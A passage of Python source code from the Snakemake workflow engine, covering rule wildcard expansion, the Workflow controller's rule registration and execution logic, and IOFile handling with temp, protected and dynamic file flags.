            inoutput.append(item)
            if name:
                inoutput.add_name(name)
        else:
            try:
                start = len(inoutput)
                for i in item:
                    self._set_inoutput_item(i, output=output)
                if name:
                    # if the list was named, make it accessible
                    inoutput.set_name(name, start, end=len(inoutput))
            except TypeError:
                raise SyntaxError(
                    "Input and output files have to be specified as strings or lists of strings.")

    @property
    def params(self):
        return self._params

    def set_params(self, *params, **kwparams):
        for item in params:
            self._set_params_item(item)
        for name, item in kwparams.items():
            self._set_params_item(item, name=name)

    def _set_params_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.params.append(item)
            if name:
                self.params.add_name(name)
        else:
            try:
                start = len(self.params)
                for i in item:
                    self._set_params_item(i)
                if name:
                    self.params.set_name(name, start, end=len(self.params))
            except TypeError:
                raise SyntaxError("Params have to be specified as strings.")

    @property
    def log(self):
        return self._log

    def set_log(self, *logs, **kwlogs):
        for item in logs:
            self._set_log_item(item)
        for name, item in kwlogs.items():
            self._set_log_item(item, name=name)

    def _set_log_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.log.append(IOFile(item,
                                   rule=self)
                            if isinstance(item, str) else item)
            if name:
                self.log.add_name(name)
        else:
            try:
                start = len(self.log)
                for i in item:
                    self._set_log_item(i)
                if name:
                    self.log.set_name(name, start, end=len(self.log))
            except TypeError:
                raise SyntaxError("Log files have to be specified as strings.")

    def expand_wildcards(self, wildcards=None):
        """
        Expand wildcards depending on the requested output
        or given wildcards dict.
        """

        def concretize_iofile(f, wildcards):
            if not isinstance(f, _IOFile):
                return IOFile(f, rule=self)
            else:
                return f.apply_wildcards(wildcards,
                                         fill_missing=f in self.dynamic_input,
                                         fail_dynamic=self.dynamic_output)

        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,
                             concretize=apply_wildcards,
                             ruleio=None):
            for name, item in olditems.allitems():
                start = len(newitems)
                is_iterable = True
                if callable(item):
                    try:
                        item = item(wildcards_obj)
                    except (Exception, BaseException) as e:
                        raise InputFunctionException(e, rule=self)
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        if not isinstance(item_, str):
                            raise RuleException(
                                "Input function did not return str or list of str.",
                                rule=self)
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                else:
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                if name:
                    newitems.set_name(
                        name, start,
                        end=len(newitems) if is_iterable else None)

        if wildcards is None:
            wildcards = dict()
        missing_wildcards = self.wildcard_names - set(wildcards.keys())

        if missing_wildcards:
            raise RuleException(
                "Could not resolve wildcards in rule {}:\n{}".format(
                    self.name, "\n".join(self.wildcard_names)),
                lineno=self.lineno,
                snakefile=self.snakefile)

        ruleio = dict()

        try:
            input = InputFiles()
            wildcards_obj = Wildcards(fromdict=wildcards)
            _apply_wildcards(input, self.input, wildcards, wildcards_obj,
                             concretize=concretize_iofile,
                             ruleio=ruleio)

            params = Params()
            _apply_wildcards(params, self.params, wildcards, wildcards_obj)

            output = OutputFiles(o.apply_wildcards(wildcards)
                                 for o in self.output)
            output.take_names(self.output.get_names())

            dependencies = {
                None if f is None else f.apply_wildcards(wildcards): rule
                for f, rule in self.dependencies.items()
            }

            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))

            log = Log()
            _apply_wildcards(log, self.log, wildcards, wildcards_obj,
                             concretize=concretize_iofile)

            benchmark = self.benchmark.apply_wildcards(
                wildcards) if self.benchmark else None
            return input, output, params, log, benchmark, ruleio, dependencies
        except WildcardError as ex:
            # this can only happen if an input contains an unresolved wildcard.
            raise RuleException(
                "Wildcards in input, params, log or benchmark file of rule {} cannot be "
                "determined from output files:\n{}".format(self, str(ex)),
                lineno=self.lineno,
                snakefile=self.snakefile)

    def is_producer(self, requested_output):
        """
        Returns True if this rule is a producer of the requested output.
        """
        try:
            for o in self.products:
                if o.match(requested_output):
                    return True
            return False
        except sre_constants.error as ex:
            raise IOFileException("{} in wildcard statement".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)
        except ValueError as ex:
            raise IOFileException("{}".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)

    def get_wildcards(self, requested_output):
        """
        Update the given wildcard dictionary by matching regular expression
        output files to the requested concrete ones.

        Arguments
        wildcards -- a dictionary of wildcards
        requested_output -- a concrete filepath
        """
        if requested_output is None:
            return dict()
        bestmatchlen = 0
        bestmatch = None

        for o in self.products:
            match = o.match(requested_output)
            if match:
                l = self.get_wildcard_len(match.groupdict())
                if not bestmatch or bestmatchlen > l:
                    bestmatch = match.groupdict()
                    bestmatchlen = l
        return bestmatch

    @staticmethod
    def get_wildcard_len(wildcards):
        """
        Return the length of the given wildcard values.

        Arguments
        wildcards -- a dict of wildcards
        """
        return sum(map(len, wildcards.values()))

    def __lt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp < 0

    def __gt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp > 0

    def __str__(self):
        return self.name

    def __hash__(self):
        return self.name.__hash__()

    def __eq__(self, other):
        return self.name == other.name


class Ruleorder:
    def __init__(self):
        self.order = list()

    def add(self, *rulenames):
        """
        Records the order of given rules as rule1 > rule2 > rule3, ...
        """
        self.order.append(list(rulenames))

    def compare(self, rule1, rule2):
        """
        Return whether rule2 has a higher priority than rule1.
        """
        # try the last clause first,
        # i.e. clauses added later overwrite those before.
        for clause in reversed(self.order):
            try:
                i = clause.index(rule1.name)
                j = clause.index(rule2.name)
                # rules with higher priority should have a smaller index
                comp = j - i
                if comp < 0:
                    comp = -1
                elif comp > 0:
                    comp = 1
                return comp
            except ValueError:
                pass

        # if not ruleorder given, prefer rule without wildcards
        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()
        if wildcard_cmp != 0:
            return wildcard_cmp

        return 0

    def __iter__(self):
        return self.order.__iter__()

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import re
import os
import sys
import signal
import json
import urllib
from collections import OrderedDict
from itertools import filterfalse, chain
from functools import partial
from operator import attrgetter

from snakemake.logging import logger, format_resources, format_resource_names
from snakemake.rules import Rule, Ruleorder
from snakemake.exceptions import RuleException, CreateRuleException, \
    UnknownRuleException, NoRulesException, print_exception, WorkflowError
from snakemake.shell import shell
from snakemake.dag import DAG
from snakemake.scheduler import JobScheduler
from snakemake.parser import parse
import snakemake.io
from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch                    
from snakemake.persistence import Persistence
from snakemake.utils import update_config


class Workflow:
    def __init__(self,
                 snakefile=None,
                 snakemakepath=None,
                 jobscript=None,
                 overwrite_shellcmd=None,
                 overwrite_config=dict(),
                 overwrite_workdir=None,
                 overwrite_configfile=None,
                 config_args=None,
                 debug=False):
        """
        Create the controller.
        """
        self._rules = OrderedDict()
        self.first_rule = None
        self._workdir = None
        self.overwrite_workdir = overwrite_workdir
        self.workdir_init = os.path.abspath(os.curdir)
        self._ruleorder = Ruleorder()
        self._localrules = set()
        self.linemaps = dict()
        self.rule_count = 0
        self.basedir = os.path.dirname(snakefile)
        self.snakefile = os.path.abspath(snakefile)
        self.snakemakepath = snakemakepath
        self.included = []
        self.included_stack = []
        self.jobscript = jobscript
        self.persistence = None
        self.global_resources = None
        self.globals = globals()
        self._subworkflows = dict()
        self.overwrite_shellcmd = overwrite_shellcmd
        self.overwrite_config = overwrite_config
        self.overwrite_configfile = overwrite_configfile
        self.config_args = config_args
        self._onsuccess = lambda log: None
        self._onerror = lambda log: None
        self.debug = debug

        global config
        config = dict()
        config.update(self.overwrite_config)

        global rules
        rules = Rules()

    @property
    def subworkflows(self):
        return self._subworkflows.values()

    @property
    def rules(self):
        return self._rules.values()

    @property
    def concrete_files(self):
        return (
            file
            for rule in self.rules for file in chain(rule.input, rule.output)
            if not callable(file) and not file.contains_wildcard()
        )

    def check(self):
        for clause in self._ruleorder:
            for rulename in clause:
                if not self.is_rule(rulename):
                    raise UnknownRuleException(
                        rulename,
                        prefix="Error in ruleorder definition.")

    def add_rule(self, name=None, lineno=None, snakefile=None):
        """
        Add a rule.
        """
        if name is None:
            name = str(len(self._rules) + 1)
        if self.is_rule(name):
            raise CreateRuleException(
                "The name {} is already used by another rule".format(name))
        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)
        self._rules[rule.name] = rule
        self.rule_count += 1
        if not self.first_rule:
            self.first_rule = rule.name
        return name

    def is_rule(self, name):
        """
        Return True if name is the name of a rule.

        Arguments
        name -- a name
        """
        return name in self._rules

    def get_rule(self, name):
        """
        Get rule by name.

        Arguments
        name -- the name of the rule
        """
        if not self._rules:
            raise NoRulesException()
        if not name in self._rules:
            raise UnknownRuleException(name)
        return self._rules[name]

    def list_rules(self, only_targets=False):
        rules = self.rules
        if only_targets:
            rules = filterfalse(Rule.has_wildcards, rules)
        for rule in rules:
            logger.rule_info(name=rule.name, docstring=rule.docstring)

    def list_resources(self):
        for resource in set(
            resource for rule in self.rules for resource in rule.resources):
            if resource not in "_cores _nodes".split():
                logger.info(resource)

    def is_local(self, rule):
        return rule.name in self._localrules or rule.norun

    def execute(self,
                targets=None,
                dryrun=False,
                touch=False,
                cores=1,
                nodes=1,
                local_cores=1,
                forcetargets=False,
                forceall=False,
                forcerun=None,
                prioritytargets=None,
                quiet=False,
                keepgoing=False,
                printshellcmds=False,
                printreason=False,
                printdag=False,
                cluster=None,
                cluster_config=None,
                cluster_sync=None,
                jobname=None,
                immediate_submit=False,
                ignore_ambiguity=False,
                printrulegraph=False,
                printd3dag=False,
                drmaa=None,
                stats=None,
                force_incomplete=False,
                ignore_incomplete=False,
                list_version_changes=False,
                list_code_changes=False,
                list_input_changes=False,
                list_params_changes=False,
                summary=False,
                detailed_summary=False,
                latency_wait=3,
                benchmark_repeats=3,
                wait_for_files=None,
                nolock=False,
                unlock=False,
                resources=None,
                notemp=False,
                nodeps=False,
                cleanup_metadata=None,
                subsnakemake=None,
                updated_files=None,
                keep_target_files=False,
                allowed_rules=None,
                greediness=1.0,
                no_hooks=False):

        self.global_resources = dict() if resources is None else resources
        self.global_resources["_cores"] = cores
        self.global_resources["_nodes"] = nodes

        def rules(items):
            return map(self._rules.__getitem__, filter(self.is_rule, items))

        if keep_target_files:

            def files(items):
                return filterfalse(self.is_rule, items)
        else:

            def files(items):
                return map(os.path.relpath, filterfalse(self.is_rule, items))

        if not targets:
            targets = [self.first_rule
                       ] if self.first_rule is not None else list()
        if prioritytargets is None:
            prioritytargets = list()
        if forcerun is None:
            forcerun = list()

        priorityrules = set(rules(prioritytargets))
        priorityfiles = set(files(prioritytargets))
        forcerules = set(rules(forcerun))
        forcefiles = set(files(forcerun))
        targetrules = set(chain(rules(targets),
                                filterfalse(Rule.has_wildcards, priorityrules),
                                filterfalse(Rule.has_wildcards, forcerules)))
        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))
        if forcetargets:
            forcefiles.update(targetfiles)
            forcerules.update(targetrules)

        rules = self.rules
        if allowed_rules:
            rules = [rule for rule in rules if rule.name in set(allowed_rules)]

        if wait_for_files is not None:
            try:
                snakemake.io.wait_for_files(wait_for_files,
                                            latency_wait=latency_wait)
            except IOError as e:
                logger.error(str(e))
                return False

        dag = DAG(
            self, rules,
            dryrun=dryrun,
            targetfiles=targetfiles,
            targetrules=targetrules,
            forceall=forceall,
            forcefiles=forcefiles,
            forcerules=forcerules,
            priorityfiles=priorityfiles,
            priorityrules=priorityrules,
            ignore_ambiguity=ignore_ambiguity,
            force_incomplete=force_incomplete,
            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,
            notemp=notemp)

        self.persistence = Persistence(
            nolock=nolock,
            dag=dag,
            warn_only=dryrun or printrulegraph or printdag or summary or
            list_version_changes or list_code_changes or list_input_changes or
            list_params_changes)

        if cleanup_metadata:
            for f in cleanup_metadata:
                self.persistence.cleanup_metadata(f)
            return True

        dag.init()
        dag.check_dynamic()

        if unlock:
            try:
                self.persistence.cleanup_locks()
                logger.info("Unlocking working directory.")
                return True
            except IOError:
                logger.error("Error: Unlocking the directory {} failed. Maybe "
                             "you don't have the permissions?")
                return False
        try:
            self.persistence.lock()
        except IOError:
            logger.error(
                "Error: Directory cannot be locked. Please make "
                "sure that no other Snakemake process is trying to create "
                "the same files in the following directory:\n{}\n"
                "If you are sure that no other "
                "instances of snakemake are running on this directory, "
                "the remaining lock was likely caused by a kill signal or "
                "a power loss. It can be removed with "
                "the --unlock argument.".format(os.getcwd()))
            return False

        if self.subworkflows and not printdag and not printrulegraph:
            # backup globals
            globals_backup = dict(self.globals)
            # execute subworkflows
            for subworkflow in self.subworkflows:
                subworkflow_targets = subworkflow.targets(dag)
                updated = list()
                if subworkflow_targets:
                    logger.info(
                        "Executing subworkflow {}.".format(subworkflow.name))
                    if not subsnakemake(subworkflow.snakefile,
                                        workdir=subworkflow.workdir,
                                        targets=subworkflow_targets,
                                        updated_files=updated):
                        return False
                    dag.updated_subworkflow_files.update(subworkflow.target(f)
                                                         for f in updated)
                else:
                    logger.info("Subworkflow {}: Nothing to be done.".format(
                        subworkflow.name))
            if self.subworkflows:
                logger.info("Executing main workflow.")
            # rescue globals
            self.globals.update(globals_backup)

        dag.check_incomplete()
        dag.postprocess()

        if nodeps:
            missing_input = [f for job in dag.targetjobs for f in job.input
                             if dag.needrun(job) and not os.path.exists(f)]
            if missing_input:
                logger.error(
                    "Dependency resolution disabled (--nodeps) "
                    "but missing input "
                    "files detected. If this happens on a cluster, please make sure "
                    "that you handle the dependencies yourself or turn of "
                    "--immediate-submit. Missing input files:\n{}".format(
                        "\n".join(missing_input)))
                return False

        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)

        if printd3dag:
            dag.d3dag()
            return True
        elif printdag:
            print(dag)
            return True
        elif printrulegraph:
            print(dag.rule_dot())
            return True
        elif summary:
            print("\n".join(dag.summary(detailed=False)))
            return True
        elif detailed_summary:
            print("\n".join(dag.summary(detailed=True)))
            return True
        elif list_version_changes:
            items = list(
                chain(*map(self.persistence.version_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_code_changes:
            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_input_changes:
            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_params_changes:
            items = list(
                chain(*map(self.persistence.params_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True

        scheduler = JobScheduler(self, dag, cores,
                                 local_cores=local_cores,
                                 dryrun=dryrun,
                                 touch=touch,
                                 cluster=cluster,
                                 cluster_config=cluster_config,
                                 cluster_sync=cluster_sync,
                                 jobname=jobname,
                                 immediate_submit=immediate_submit,
                                 quiet=quiet,
                                 keepgoing=keepgoing,
                                 drmaa=drmaa,
                                 printreason=printreason,
                                 printshellcmds=printshellcmds,
                                 latency_wait=latency_wait,
                                 benchmark_repeats=benchmark_repeats,
                                 greediness=greediness)

        if not dryrun and not quiet:
            if len(dag):
                if cluster or cluster_sync or drmaa:
                    logger.resources_info(
                        "Provided cluster nodes: {}".format(nodes))
                else:
                    logger.resources_info("Provided cores: {}".format(cores))
                    logger.resources_info("Rules claiming more threads will be scaled down.")
                provided_resources = format_resources(resources)
                if provided_resources:
                    logger.resources_info(
                        "Provided resources: " + provided_resources)
                ignored_resources = format_resource_names(
                    set(resource for job in dag.needrun_jobs for resource in
                        job.resources_dict if resource not in resources))
                if ignored_resources:
                    logger.resources_info(
                        "Ignored resources: " + ignored_resources)
                logger.run_info("\n".join(dag.stats()))
            else:
                logger.info("Nothing to be done.")
        if dryrun and not len(dag):
            logger.info("Nothing to be done.")

        success = scheduler.schedule()

        if success:
            if dryrun:
                if not quiet and len(dag):
                    logger.run_info("\n".join(dag.stats()))
            elif stats:
                scheduler.stats.to_json(stats)
            if not dryrun and not no_hooks:
                self._onsuccess(logger.get_logfile())
            return True
        else:
            if not dryrun and not no_hooks:
                self._onerror(logger.get_logfile())
            return False

    def include(self, snakefile,
                overwrite_first_rule=False,
                print_compilation=False,
                overwrite_shellcmd=None):
        """
        Include a snakefile.
        """
        # check if snakefile is a path to the filesystem
        if not urllib.parse.urlparse(snakefile).scheme:
            if not os.path.isabs(snakefile) and self.included_stack:
                current_path = os.path.dirname(self.included_stack[-1])
                snakefile = os.path.join(current_path, snakefile)
            snakefile = os.path.abspath(snakefile)
        # else it could be an url.
        # at least we don't want to modify the path for clarity.

        if snakefile in self.included:
            logger.info("Multiple include of {} ignored".format(snakefile))
            return
        self.included.append(snakefile)
        self.included_stack.append(snakefile)

        global workflow

        workflow = self

        first_rule = self.first_rule
        code, linemap = parse(snakefile,
                              overwrite_shellcmd=self.overwrite_shellcmd)

        if print_compilation:
            print(code)

        # insert the current directory into sys.path
        # this allows to import modules from the workflow directory
        sys.path.insert(0, os.path.dirname(snakefile))

        self.linemaps[snakefile] = linemap
        exec(compile(code, snakefile, "exec"), self.globals)
        if not overwrite_first_rule:
            self.first_rule = first_rule
        self.included_stack.pop()

    def onsuccess(self, func):
        self._onsuccess = func

    def onerror(self, func):
        self._onerror = func

    def workdir(self, workdir):
        if self.overwrite_workdir is None:
            if not os.path.exists(workdir):
                os.makedirs(workdir)
            self._workdir = workdir
            os.chdir(workdir)

    def configfile(self, jsonpath):
        """ Update the global config with the given dictionary. """
        global config
        c = snakemake.io.load_configfile(jsonpath)
        update_config(config, c)
        update_config(config, self.overwrite_config)

    def ruleorder(self, *rulenames):
        self._ruleorder.add(*rulenames)

    def subworkflow(self, name, snakefile=None, workdir=None):
        sw = Subworkflow(self, name, snakefile, workdir)
        self._subworkflows[name] = sw
        self.globals[name] = sw.target

    def localrules(self, *rulenames):
        self._localrules.update(rulenames)

    def rule(self, name=None, lineno=None, snakefile=None):
        name = self.add_rule(name, lineno, snakefile)
        rule = self.get_rule(name)

        def decorate(ruleinfo):
            if ruleinfo.input:
                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])
            if ruleinfo.output:
                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])
            if ruleinfo.params:
                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])
            if ruleinfo.threads:
                if not isinstance(ruleinfo.threads, int):
                    raise RuleException("Threads value has to be an integer.",
                                        rule=rule)
                rule.resources["_cores"] = ruleinfo.threads
            if ruleinfo.resources:
                args, resources = ruleinfo.resources
                if args:
                    raise RuleException("Resources have to be named.")
                if not all(map(lambda r: isinstance(r, int),
                               resources.values())):
                    raise RuleException(
                        "Resources values have to be integers.",
                        rule=rule)
                rule.resources.update(resources)
            if ruleinfo.priority:
                if (not isinstance(ruleinfo.priority, int) and
                    not isinstance(ruleinfo.priority, float)):
                    raise RuleException("Priority values have to be numeric.",
                                        rule=rule)
                rule.priority = ruleinfo.priority
            if ruleinfo.version:
                rule.version = ruleinfo.version
            if ruleinfo.log:
                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])
            if ruleinfo.message:
                rule.message = ruleinfo.message
            if ruleinfo.benchmark:
                rule.benchmark = ruleinfo.benchmark
            rule.norun = ruleinfo.norun
            rule.docstring = ruleinfo.docstring
            rule.run_func = ruleinfo.func
            rule.shellcmd = ruleinfo.shellcmd
            ruleinfo.func.__name__ = "__{}".format(name)
            self.globals[ruleinfo.func.__name__] = ruleinfo.func
            setattr(rules, name, rule)
            return ruleinfo.func

        return decorate

    def docstring(self, string):
        def decorate(ruleinfo):
            ruleinfo.docstring = string
            return ruleinfo

        return decorate

    def input(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.input = (paths, kwpaths)
            return ruleinfo

        return decorate

    def output(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.output = (paths, kwpaths)
            return ruleinfo

        return decorate

    def params(self, *params, **kwparams):
        def decorate(ruleinfo):
            ruleinfo.params = (params, kwparams)
            return ruleinfo

        return decorate

    def message(self, message):
        def decorate(ruleinfo):
            ruleinfo.message = message
            return ruleinfo

        return decorate

    def benchmark(self, benchmark):
        def decorate(ruleinfo):
            ruleinfo.benchmark = benchmark
            return ruleinfo

        return decorate

    def threads(self, threads):
        def decorate(ruleinfo):
            ruleinfo.threads = threads
            return ruleinfo

        return decorate

    def resources(self, *args, **resources):
        def decorate(ruleinfo):
            ruleinfo.resources = (args, resources)
            return ruleinfo

        return decorate

    def priority(self, priority):
        def decorate(ruleinfo):
            ruleinfo.priority = priority
            return ruleinfo

        return decorate

    def version(self, version):
        def decorate(ruleinfo):
            ruleinfo.version = version
            return ruleinfo

        return decorate

    def log(self, *logs, **kwlogs):
        def decorate(ruleinfo):
            ruleinfo.log = (logs, kwlogs)
            return ruleinfo

        return decorate

    def shellcmd(self, cmd):
        def decorate(ruleinfo):
            ruleinfo.shellcmd = cmd
            return ruleinfo

        return decorate

    def norun(self):
        def decorate(ruleinfo):
            ruleinfo.norun = True
            return ruleinfo

        return decorate

    def run(self, func):
        return RuleInfo(func)

    @staticmethod
    def _empty_decorator(f):
        return f


class RuleInfo:
    def __init__(self, func):
        self.func = func
        self.shellcmd = None
        self.norun = False
        self.input = None
        self.output = None
        self.params = None
        self.message = None
        self.benchmark = None
        self.threads = None
        self.resources = None
        self.priority = None
        self.version = None
        self.log = None
        self.docstring = None


class Subworkflow:
    def __init__(self, workflow, name, snakefile, workdir):
        self.workflow = workflow
        self.name = name
        self._snakefile = snakefile
        self._workdir = workdir

    @property
    def snakefile(self):
        if self._snakefile is None:
            return os.path.abspath(os.path.join(self.workdir, "Snakefile"))
        if not os.path.isabs(self._snakefile):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                self._snakefile))
        return self._snakefile

    @property
    def workdir(self):
        workdir = "." if self._workdir is None else self._workdir
        if not os.path.isabs(workdir):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                workdir))
        return workdir

    def target(self, paths):
        if not_iterable(paths):
            return flag(os.path.join(self.workdir, paths), "subworkflow", self)
        return [self.target(path) for path in paths]

    def targets(self, dag):
        return [f for job in dag.jobs for f in job.subworkflow_input
                if job.subworkflow_input[f] is self]


class Rules:
    """ A namespace for rules so that they can be accessed via dot notation. """
    pass


def srcdir(path):
    """Return the absolute path, relative to the source directory of the current Snakefile."""
    if not workflow.included_stack:
        return None
    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import stat
import time
import json
from itertools import product, chain
from collections import Iterable, namedtuple
from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError                    
from snakemake.logging import logger


def lstat(f):
    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)


def lutime(f, times):
    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)


def lchmod(f, mode):
    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)


def IOFile(file, rule=None):
    f = _IOFile(file)
    f.rule = rule
    return f


class _IOFile(str):
    """
    A file that is either input or output of a rule.
    """

    dynamic_fill = "__snakemake_dynamic__"

    def __new__(cls, file):
        obj = str.__new__(cls, file)
        obj._is_function = type(file).__name__ == "function"
        obj._file = file
        obj.rule = None
        obj._regex = None
        return obj

    @property
    def file(self):
        if not self._is_function:
            return self._file
        else:
            raise ValueError("This IOFile is specified as a function and "
                             "may not be used directly.")

    @property
    def exists(self):
        return os.path.exists(self.file)

    @property
    def protected(self):                    
        return self.exists and not os.access(self.file, os.W_OK)                    

    @property
    def mtime(self):
        # do not follow symlinks for modification time
        return lstat(self.file).st_mtime

    @property
    def size(self):
        # follow symlinks but throw error if invalid
        self.check_broken_symlink()
        return os.path.getsize(self.file)

    def check_broken_symlink(self):
        """ Raise WorkflowError if file is a broken symlink. """
        if not self.exists and lstat(self.file):                    
            raise WorkflowError("File {} seems to be a broken symlink.".format(self.file))

    def is_newer(self, time):
        return self.mtime > time

    def prepare(self):
        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]
        dir = os.path.dirname(path_until_wildcard)
        if len(dir) > 0 and not os.path.exists(dir):
            try:
                os.makedirs(dir)
            except OSError as e:
                # ignore Errno 17 "File exists" (reason: multiprocessing)
                if e.errno != 17:
                    raise e

    def protect(self):
        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~
                stat.S_IWOTH)
        if os.path.isdir(self.file):
            for root, dirs, files in os.walk(self.file):
                for d in dirs:
                    lchmod(os.path.join(self.file, d), mode)
                for f in files:
                    lchmod(os.path.join(self.file, f), mode)
        else:
            lchmod(self.file, mode)

    def remove(self):
        remove(self.file)

    def touch(self):                    
        try:
            lutime(self.file, None)                    
        except OSError as e:
            if e.errno == 2:
                raise MissingOutputException(
                    "Output file {} of rule {} shall be touched but "
                    "does not exist.".format(self.file, self.rule.name),
                    lineno=self.rule.lineno,
                    snakefile=self.rule.snakefile)
            else:
                raise e

    def touch_or_create(self):
        try:
            self.touch()
        except MissingOutputException:
            # create empty file
            with open(self.file, "w") as f:
                pass

    def apply_wildcards(self, wildcards,
                        fill_missing=False,
                        fail_dynamic=False):
        f = self._file
        if self._is_function:
            f = self._file(Namedlist(fromdict=wildcards))

        return IOFile(apply_wildcards(f, wildcards,                    
                                      fill_missing=fill_missing,
                                      fail_dynamic=fail_dynamic,
                                      dynamic_fill=self.dynamic_fill),
                      rule=self.rule)                    

    def get_wildcard_names(self):
        return get_wildcard_names(self.file)

    def contains_wildcard(self):
        return contains_wildcard(self.file)

    def regex(self):
        if self._regex is None:
            # compile a regular expression
            self._regex = re.compile(regex(self.file))
        return self._regex

    def constant_prefix(self):
        first_wildcard = _wildcard_regex.search(self.file)
        if first_wildcard:
            return self.file[:first_wildcard.start()]
        return self.file

    def match(self, target):
        return self.regex().match(target) or None

    def format_dynamic(self):
        return self.replace(self.dynamic_fill, "{*}")

    def __eq__(self, other):
        f = other._file if isinstance(other, _IOFile) else other
        return self._file == f

    def __hash__(self):
        return self._file.__hash__()


_wildcard_regex = re.compile(
    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>([^\{\}]+|\{\d+(,\d+)?\})*))?\s*\}")

#    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>[^\}]*))?\s*\}")


def wait_for_files(files, latency_wait=3):
    """Wait for given files to be present in filesystem."""
    files = list(files)
    get_missing = lambda: [f for f in files if not os.path.exists(f)]
    missing = get_missing()
    if missing:
        logger.info("Waiting at most {} seconds for missing files.".format(
            latency_wait))
        for _ in range(latency_wait):
            if not get_missing():
                return
            time.sleep(1)
        raise IOError("Missing files after {} seconds:\n{}".format(
            latency_wait, "\n".join(get_missing())))


def get_wildcard_names(pattern):
    return set(match.group('name')
               for match in _wildcard_regex.finditer(pattern))


def contains_wildcard(path):
    return _wildcard_regex.search(path) is not None


def remove(file):
    if os.path.exists(file):
        if os.path.isdir(file):
            try:
                os.removedirs(file)
            except OSError:
                # ignore non empty directories
                pass
        else:
            os.remove(file)


def regex(filepattern):
    f = []
    last = 0
    wildcards = set()
    for match in _wildcard_regex.finditer(filepattern):
        f.append(re.escape(filepattern[last:match.start()]))
        wildcard = match.group("name")
        if wildcard in wildcards:
            if match.group("constraint"):
                raise ValueError(
                    "If multiple wildcards of the same name "
                    "appear in a string, eventual constraints have to be defined "
                    "at the first occurence and will be inherited by the others.")
            f.append("(?P={})".format(wildcard))
        else:
            wildcards.add(wildcard)
            f.append("(?P<{}>{})".format(wildcard, match.group("constraint") if
                                         match.group("constraint") else ".+"))
        last = match.end()
    f.append(re.escape(filepattern[last:]))
    f.append("$")  # ensure that the match spans the whole file
    return "".join(f)


def apply_wildcards(pattern, wildcards,
                    fill_missing=False,
                    fail_dynamic=False,
                    dynamic_fill=None,
                    keep_dynamic=False):
    def format_match(match):
        name = match.group("name")
        try:
            value = wildcards[name]
            if fail_dynamic and value == dynamic_fill:
                raise WildcardError(name)
            return str(value)  # convert anything into a str
        except KeyError as ex:
            if keep_dynamic:
                return "{{{}}}".format(name)
            elif fill_missing:
                return dynamic_fill
            else:
                raise WildcardError(str(ex))

    return re.sub(_wildcard_regex, format_match, pattern)


def not_iterable(value):
    return isinstance(value, str) or not isinstance(value, Iterable)


class AnnotatedString(str):
    def __init__(self, value):
        self.flags = dict()


def flag(value, flag_type, flag_value=True):
    if isinstance(value, AnnotatedString):
        value.flags[flag_type] = flag_value
        return value
    if not_iterable(value):
        value = AnnotatedString(value)
        value.flags[flag_type] = flag_value
        return value
    return [flag(v, flag_type, flag_value=flag_value) for v in value]


def is_flagged(value, flag):
    if isinstance(value, AnnotatedString):
        return flag in value.flags                    
    return False


def temp(value):
    """
    A flag for an input or output file that shall be removed after usage.
    """
    if is_flagged(value, "protected"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "temp")


def temporary(value):
    """ An alias for temp. """
    return temp(value)


def protected(value):
    """ A flag for a file that shall be write protected after creation. """
    if is_flagged(value, "temp"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "protected")


def dynamic(value):
    """
    A flag for a file that shall be dynamic, i.e. the multiplicity
    (and wildcard values) will be expanded after a certain
    rule has been run """
    annotated = flag(value, "dynamic")                    
    tocheck = [annotated] if not_iterable(annotated) else annotated
    for file in tocheck:
        matches = list(_wildcard_regex.finditer(file))
        #if len(matches) != 1:
        #    raise SyntaxError("Dynamic files need exactly one wildcard.")
